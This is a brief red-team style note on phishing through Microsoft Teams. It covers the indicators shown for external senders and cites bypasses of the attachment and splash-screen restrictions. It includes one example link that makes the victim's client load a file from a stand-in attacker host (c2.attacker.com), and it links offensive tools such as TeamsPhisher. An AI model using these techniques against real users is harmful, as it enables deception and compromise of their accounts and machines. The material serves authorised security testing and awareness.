---
title: Phishing via Teams
---

Anybody can send Teams message to any email address.
Just press `alt+n` in Teams.

The recipient gets various indicators if the sender is external:

- warning popup when the chat is opened the first time
- if the sender belongs to a enterprise tenant the domain is displayed below the attacker-controlled sender name
- if the sender is a personal account no domain is shown
- in the chat the sender name is suffixed with `(external)`

It shouldn't be possible to send attachments to external organizations, but this restriction can be bypassed ([source](http://web.archive.org/web/20230106091541/https://scribe.rip/@bobbyrsec/microsoft-teams-attachment-spoofing-and-lack-of-permissions-enforcement-leads-to-rce-via-ntlm-458aea1826c5), [source](http://web.archive.org/web/20230621205851/https://labs.jumpsec.com/advisory-idor-in-microsoft-teams-allows-for-external-tenants-to-introduce-malware/)).
Furthermore Teams accepts links to URL handlers like `ms-excel:/ofv|u|//c2.attacker.com@80/share/test.xlsx`, but UNC paths like `\\something`, `\\something@80` and `file://something` are blocked.

Untested tools:

- [TeamsBreaker](https://github.com/ASOT-LABS/TeamsBreaker)
- [TeamsPhisher](https://github.com/Octoberfest7/TeamsPhisher)

References:

- [Speedrun for a O365 Phishing infrastructure](https://web.archive.org/web/20231205060205/https://badoption.eu/blog/2023/12/03/PhishingInfra.html), use free dev tenant
- [Teams external participant splash screen bypass #2](http://web.archive.org/web/20240117151926/https://badoption.eu/blog/2024/01/12/teams5.html)
- [Teams external participant splash screen bypass](http://web.archive.org/web/20231002132013/https://badoption.eu/blog/2023/09/27/teams4.html)
- [twitter.com/jamieantisocial/status/1686828931737853952](https://twitter.com/jamieantisocial/status/1686828931737853952), example pretext used in real campaign
- [Obscurities with MS Teams part 3](https://web.archive.org/web/20231207181845/https://badoption.eu/blog/2023/06/30/teams3.html)
